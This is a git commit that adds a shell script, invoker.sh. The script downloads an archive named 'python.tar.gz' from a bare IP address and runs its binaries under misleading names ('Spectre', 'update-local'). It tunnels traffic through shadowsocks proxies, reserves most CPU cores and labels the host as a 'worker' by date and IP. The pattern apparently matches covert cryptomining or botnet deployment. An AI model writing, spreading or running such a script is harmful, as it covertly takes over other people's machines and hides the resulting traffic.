e18bff257edfce39988639e536cf0ed5330e6214
williamarmenta54 <williamarmenta54@gmail.com>
2024-09-05 08:22:09 +0200

    Create invoker.sh

---
+++ invoker.sh
@@ -0,0 +1,65 @@
+#!/bin/sh
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+currentdate=$(date '+%d-%b-%Y_Shiny_')
+ipaddress=$(curl -s api.ipify.org)
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+currentdate+=$underscored_ip
+used_num_of_cores=`expr $num_of_cores - 3`
+echo ""
+echo $used_num_of_cores
+echo ""
+
+export TERM=linux
+
+wget -q http://172.232.204.60/python.tar.gz >/dev/null
+
+sleep 2
+
+tar -xf python.tar.gz
+
+./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
+
+sleep 2
+
+curl -x socks5h://127.0.0.1:1082 ifconfig.me
+
+sleep 2
+
+echo " "
+echo " "
+echo " "
+echo " "
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1082
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+echo "Your worker is : $currentdate "
+
+sleep 2
+
+pip-python;pip3 install -r requirements.txt
+
+sleep 2
+
+./update/update python3 main.py
+
+
